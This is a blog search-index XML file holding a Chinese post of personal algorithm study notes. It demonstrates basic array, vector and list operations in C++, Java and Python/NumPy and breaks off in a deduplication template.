<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>算法笔记</title>
    <link href="/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="一-数组"><a href="#一-数组" class="headerlink" title="一.数组"></a>一.数组</h1><p>c++的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span>  <span class="hljs-comment">// For sort and reverse</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化数组</span><br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;数组第一个元素: &quot;</span> &lt;&lt; arr[<span class="hljs-number">0</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 1</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;数组第三个元素: &quot;</span> &lt;&lt; arr[<span class="hljs-number">2</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 3</span><br><br>    <span class="hljs-comment">// 修改数组元素</span><br>    arr[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;修改后的第三个元素: &quot;</span> &lt;&lt; arr[<span class="hljs-number">2</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 10</span><br><br>    <span class="hljs-comment">// 使用范围for循环遍历数组 (C++11及以上)</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;数组元素: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) &#123;<br>        std::cout &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 初始化vector</span><br>    std::vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;vector第一个元素: &quot;</span> &lt;&lt; vec[<span class="hljs-number">0</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 1</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;vector第三个元素: &quot;</span> &lt;&lt; vec[<span class="hljs-number">2</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 3</span><br><br>    <span class="hljs-comment">// 修改vector元素</span><br>    vec[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;修改后的第三个元素: &quot;</span> &lt;&lt; vec[<span class="hljs-number">2</span>] &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 10</span><br><br>    <span class="hljs-comment">// 使用at()方法访问元素</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;使用at()访问第三个元素: &quot;</span> &lt;&lt; vec.<span class="hljs-built_in">at</span>(<span class="hljs-number">2</span>) &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 10</span><br><br>    <span class="hljs-comment">// 向vector中添加元素</span><br>    vec.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">6</span>);  <span class="hljs-comment">// 添加到末尾</span><br>    vec.<span class="hljs-built_in">insert</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">1</span>, <span class="hljs-number">7</span>);  <span class="hljs-comment">// 在索引1处插入</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;添加元素后的vector: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : vec) &#123;<br>        std::cout &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 从vector中删除元素</span><br>    vec.<span class="hljs-built_in">erase</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 删除索引1处的元素</span><br>    vec.<span class="hljs-built_in">pop_back</span>();  <span class="hljs-comment">// 删除末尾元素</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;删除元素后的vector: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : vec) &#123;<br>        std::cout &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 清空vector</span><br>    vec.<span class="hljs-built_in">clear</span>();<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;清空后的vector大小: &quot;</span> &lt;&lt; vec.<span class="hljs-built_in">size</span>() &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 0</span><br><br>    <span class="hljs-comment">// 重新填充vector</span><br>    vec = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <br>    <span class="hljs-comment">// 排序和反转vector</span><br>    std::<span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;排序后的vector: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : vec) &#123;<br>        std::cout &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    std::<span class="hljs-built_in">reverse</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;反转后的vector: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : vec) &#123;<br>        std::cout &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 使用迭代器遍历vector</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;使用迭代器遍历vector: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (std::vector&lt;<span class="hljs-type">int</span>&gt;::iterator it = vec.<span class="hljs-built_in">begin</span>(); it != vec.<span class="hljs-built_in">end</span>(); ++it) &#123;<br>        std::cout &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>std::cout 的组成部分<br>  std：这是标准命名空间（<span class="hljs-keyword">namespace</span>）的缩写。在C++标准库中的所有功能都包含在命名空间 std 中。使用 std:: 作为前缀是为了避免命名冲突。<br>  cout：这是标准输出流对象，表示 <span class="hljs-string">&quot;character output stream&quot;</span>。cout 是 std 命名空间中的一个对象，用于将数据输出到标准输出设备（通常是控制台）。<br> std::endl 的详细解释<br>  作用<br>  插入换行符：在输出流中插入一个换行符（即 \n）。<br>  刷新缓冲区：强制刷新输出缓冲区，确保所有缓冲的输出内容都被实际写入到输出设备（如控制台）上。<br> 何时使用std::endl？<br> 需要立即显示输出：当你希望输出立即显示，而不是等待缓冲区满或者程序结束时，可以使用 std::endl。<br> 调试输出：在调试时使用 std::endl 可以确保所有调试信息都立即显示，帮助更快地定位问题。<br></code></pre></td></tr></table></figure><p>java的操作</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-symbol">java</span> &#123;<br>    <span class="hljs-keyword">public</span> static <span class="hljs-built_in">void</span> main(String[] args) &#123;<br>        <span class="hljs-comment">// 初始化数组</span><br>        <span class="hljs-built_in">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-comment">// 访问元素</span><br>        System.<span class="hljs-keyword">out</span>.println(arr[<span class="hljs-number">2</span>]);  <span class="hljs-comment">// 输出 3, 访问数组中索引为2的元素</span><br>        <span class="hljs-comment">// 修改元素</span><br>        arr[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 将数组中索引为2的元素修改为10</span><br>        <span class="hljs-comment">// 使用ArrayList来实现动态数组Arrays.asList是java.util.Arrays类中的一个静态方法，它接受一个可变参数（varargs）并返回一个包含这些元素的固定大小的List然后使用new ArrayList&lt;&gt;(...)构造一个新的ArrayList对象，初始内容为上述固定大小的List中的元素。这使得新创建的ArrayList具有这些初始元素，同时它是可变大小的，可以添加和删除元素。</span><br>        List&lt;Integer&gt; list = new ArrayList&lt;&gt;(Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>));<br>        <span class="hljs-comment">// 添加元素</span><br>        list.add(<span class="hljs-number">6</span>);  <span class="hljs-comment">// 在数组末尾添加元素6</span><br>        <span class="hljs-comment">// 删除元素之前先检查是否存在</span><br>        <span class="hljs-keyword">if</span> (list.contains(<span class="hljs-number">3</span>)) &#123;  <span class="hljs-comment">// 检查元素3是否在数组中</span><br>            list.remove(Integer.valueOf(<span class="hljs-number">3</span>));  <span class="hljs-comment">// 删除数组中的元素3</span><br>        &#125;<br>        <span class="hljs-comment">// 打印修改后的数组</span><br>        System.<span class="hljs-keyword">out</span>.println(list);  <span class="hljs-comment">// 输出修改后的数组 [1, 2, 10, 4, 5, 6]</span><br><br><br>        <span class="hljs-built_in">int</span>[] <span class="hljs-built_in">int</span>Array = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        String[] strArray = new String[<span class="hljs-number">5</span>];  <span class="hljs-comment">// 初始化一个包含5个元素的数组，元素默认值为null</span><br>        <span class="hljs-built_in">int</span> firstElement = <span class="hljs-built_in">int</span>Array[<span class="hljs-number">0</span>];  <span class="hljs-comment">// 访问第一个元素</span><br>        <span class="hljs-built_in">int</span>Array[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 修改第三个元素的值为10</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">int</span>Array.length; i++) &#123;<br>            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">int</span>Array[i]);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> value : <span class="hljs-built_in">int</span>Array) &#123;<br>            System.<span class="hljs-keyword">out</span>.println(value);<br>        &#125;<br>        Arrays.sort(<span class="hljs-built_in">int</span>Array);  <span class="hljs-comment">// 对数组进行排序，要import java.util.Arrays;</span><br><br>        <span class="hljs-built_in">int</span>[] newArray = Arrays.copyOf(<span class="hljs-built_in">int</span>Array, <span class="hljs-built_in">int</span>Array.length);  <span class="hljs-comment">// 复制整个数组</span><br>        <span class="hljs-built_in">int</span>[] partialArray = Arrays.copyOf(<span class="hljs-built_in">int</span>Array, <span class="hljs-number">3</span>);  <span class="hljs-comment">// 复制数组的前3个元素</span><br>        <span class="hljs-built_in">int</span>[] destinationArray = new <span class="hljs-built_in">int</span>[<span class="hljs-number">10</span>];<br>        System.<span class="hljs-built_in">array</span>copy(<span class="hljs-built_in">int</span>Array, <span class="hljs-number">0</span>, destinationArray, <span class="hljs-number">0</span>, <span class="hljs-built_in">int</span>Array.length);  <span class="hljs-comment">// 复制数组到另一个数组</span><br><br>        String <span class="hljs-built_in">array</span>String = Arrays.toString(<span class="hljs-built_in">int</span>Array);<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>String);  <span class="hljs-comment">// 输出数组的字符串表示</span><br>        List&lt;Integer&gt; <span class="hljs-built_in">array</span>List = new ArrayList&lt;&gt;(Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>));<br><br>        Arrays.fill(<span class="hljs-built_in">int</span>Array, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 将数组的所有元素设置为10</span><br>        Arrays.fill(<span class="hljs-built_in">int</span>Array, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">20</span>);  <span class="hljs-comment">// 将数组的部分元素设置为20（索引1到2）</span><br>        <span class="hljs-built_in">int</span>[] anotherArray = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-built_in">bool</span>ean <span class="hljs-built_in">array</span>sEqual = Arrays.equals(<span class="hljs-built_in">int</span>Array, anotherArray);  <span class="hljs-comment">// 检查两个数组是否相等</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Arrays are equal: &quot;</span> + <span class="hljs-built_in">array</span>sEqual);<br><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>py的操作</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 初始化列表</span><br><span class="hljs-attribute">arr</span> =<span class="hljs-meta"> [1, 2, 3, 4, 5]</span><br><br><span class="hljs-comment"># 访问元素</span><br><span class="hljs-attribute">print</span>(arr[<span class="hljs-number">0</span>])  # 输出 <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(arr[<span class="hljs-number">2</span>])  # 输出 <span class="hljs-number">3</span><br><br><span class="hljs-comment"># 修改元素</span><br><span class="hljs-attribute">arr</span>[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span><br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [1, 2, 10, 4, 5]</span><br><br><span class="hljs-comment"># 添加元素</span><br><span class="hljs-attribute">arr</span>.append(<span class="hljs-number">6</span>)  # 在末尾添加<br><span class="hljs-attribute">arr</span>.insert(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>)  # 在索引<span class="hljs-number">1</span>处插入<br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [1, 7, 2, 10, 4, 5, 6]</span><br><br><span class="hljs-comment"># 删除元素</span><br><span class="hljs-attribute">arr</span>.remove(<span class="hljs-number">7</span>)  # 移除第一个值为<span class="hljs-number">7</span>的元素<br><span class="hljs-attribute">del</span> arr[<span class="hljs-number">2</span>]  # 删除索引<span class="hljs-number">2</span>处的元素<br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [1, 2, 10, 4, 5, 6]</span><br><br><span class="hljs-comment"># 切片</span><br><span class="hljs-attribute">sub_arr</span> = arr[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]  # 从索引<span class="hljs-number">1</span>到索引<span class="hljs-number">3</span>的子数组<br><span class="hljs-attribute">print</span>(sub_arr)  # 输出<span class="hljs-meta"> [2, 10, 4]</span><br><br><span class="hljs-comment"># 遍历</span><br><span class="hljs-attribute">for</span> value in arr:<br>    <span class="hljs-attribute">print</span>(value, end=&#x27; &#x27;)  # 输出 <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">print</span>()<br><br><span class="hljs-comment"># 使用索引遍历</span><br><span class="hljs-attribute">for</span> i in range(len(arr)):<br>    <span class="hljs-attribute">print</span>(arr[i], end=&#x27; &#x27;)  # 输出 <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">print</span>()<br><br><span class="hljs-comment"># 检查元素是否在列表中</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">10</span> in arr)  # 输出 True<br><br><span class="hljs-comment"># 获取长度</span><br><span class="hljs-attribute">print</span>(len(arr))  # 输出 <span class="hljs-number">6</span><br><br><span class="hljs-comment"># 列表合并</span><br><span class="hljs-attribute">arr2</span> =<span class="hljs-meta"> [7, 8, 9]</span><br><span class="hljs-attribute">combined_arr</span> = arr + arr2<br><span class="hljs-attribute">print</span>(combined_arr)  # 输出<span class="hljs-meta"> [1, 2, 10, 4, 5, 6, 7, 8, 9]</span><br><br><span class="hljs-comment"># 列表排序</span><br><span class="hljs-attribute">arr</span>.sort()<br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [1, 2, 4, 5, 6, 10]</span><br><br><span class="hljs-comment"># 列表反转</span><br><span class="hljs-attribute">arr</span>.reverse()<br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [10, 6, 5, 4, 2, 1]</span><br><br><br><span class="hljs-comment">#使用 NumPy 数组操作</span><br><span class="hljs-attribute">import</span> numpy as np<br><br><span class="hljs-comment"># 初始化数组</span><br><span class="hljs-attribute">arr</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><br><span class="hljs-comment"># 访问元素</span><br><span class="hljs-attribute">print</span>(arr[<span class="hljs-number">0</span>])  # 输出 <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(arr[<span class="hljs-number">2</span>])  # 输出 <span class="hljs-number">3</span><br><br><span class="hljs-comment"># 修改元素</span><br><span class="hljs-attribute">arr</span>[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span><br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [ 1  2 10  4  5]</span><br><br><span class="hljs-comment"># 切片</span><br><span class="hljs-attribute">sub_arr</span> = arr[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]  # 从索引<span class="hljs-number">1</span>到索引<span class="hljs-number">3</span>的子数组<br><span class="hljs-attribute">print</span>(sub_arr)  # 输出<span class="hljs-meta"> [ 2 10  4]</span><br><br><span class="hljs-comment"># 遍历</span><br><span class="hljs-attribute">for</span> value in arr:<br>    <span class="hljs-attribute">print</span>(value, end=&#x27; &#x27;)  # 输出 <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">print</span>()<br><span class="hljs-comment"># 数组元素的加法</span><br><span class="hljs-attribute">arr2</span> = np.array([<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>])<br><span class="hljs-attribute">result</span> = arr + arr2<br><span class="hljs-attribute">print</span>(result)  # 输出<span class="hljs-meta"> [11 22 40 44 55]</span><br><br><span class="hljs-comment"># 数组元素的乘法</span><br><span class="hljs-attribute">result</span> = arr * <span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(result)  # 输出<span class="hljs-meta"> [ 2  4 20  8 10]</span><br><br><span class="hljs-comment"># 数组的矩阵运算</span><br><span class="hljs-attribute">matrix1</span> = np.array([[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>],<span class="hljs-meta"> [3, 4]])</span><br><span class="hljs-meta">matrix2 = np.array([[5, 6], [7, 8]])</span><br><span class="hljs-meta">result = np.dot(matrix1, matrix2)</span><br><span class="hljs-meta">print(result)</span><br><span class="hljs-meta"># 输出</span><br><span class="hljs-meta"># [[19 22]</span><br><span class="hljs-comment">#  [43 50]]</span><br><span class="hljs-comment"># 创建特定形状的数组</span><br><span class="hljs-attribute">zeros</span> = np.zeros((<span class="hljs-number">3</span>, <span class="hljs-number">3</span>))<br><span class="hljs-attribute">print</span>(zeros)<br><span class="hljs-comment"># 输出</span><br><span class="hljs-comment"># [[0. 0. 0.]</span><br><span class="hljs-comment">#  [0. 0. 0.]</span><br><span class="hljs-comment">#  [0. 0. 0.]]</span><br><br><span class="hljs-attribute">ones</span> = np.ones((<span class="hljs-number">2</span>, <span class="hljs-number">4</span>))<br><span class="hljs-attribute">print</span>(ones)<br><span class="hljs-comment"># 输出</span><br><span class="hljs-comment"># [[1. 1. 1. 1.]</span><br><span class="hljs-comment">#  [1. 1. 1. 1.]]</span><br><br><span class="hljs-comment"># 生成等差数组</span><br><span class="hljs-attribute">arr</span> = np.arange(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(arr)  # 输出<span class="hljs-meta"> [0 2 4 6 8]</span><br><br><span class="hljs-comment"># 数组重塑</span><br><span class="hljs-attribute">arr</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])<br><span class="hljs-attribute">reshaped</span> = arr.reshape((<span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br><span class="hljs-attribute">print</span>(reshaped)<br><span class="hljs-comment"># 输出</span><br><span class="hljs-comment"># [[1 2 3]</span><br><span class="hljs-comment">#  [4 5 6]]</span><br><span class="hljs-comment"># 创建一个包含1到10的平方的列表</span><br><span class="hljs-attribute">squares</span> =<span class="hljs-meta"> [x**2 for x in range(1, 11)]</span><br><span class="hljs-attribute">print</span>(squares)  # 输出<span class="hljs-meta"> [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br><br><span class="hljs-comment"># 过滤列表中的元素</span><br><span class="hljs-attribute">even_squares</span> =<span class="hljs-meta"> [x**2 for x in range(1, 11) if x % 2 == 0]</span><br><span class="hljs-attribute">print</span>(even_squares)  # 输出<span class="hljs-meta"> [4, 16, 36, 64, 100]</span><br></code></pre></td></tr></table></figure><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>针对去重这类操作的模版</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">num</span>.size;i++)&#123;<br><span class="hljs-keyword">if</span>(要什么)&#123;<br><span class="hljs-built_in">num</span>[n] = <span class="hljs-built_in">num</span>[i];<br>n++;<br>&#125;<br>&#125;<br>去重:i=<span class="hljs-number">0</span> || <span class="hljs-built_in">num</span>[i]!=<span 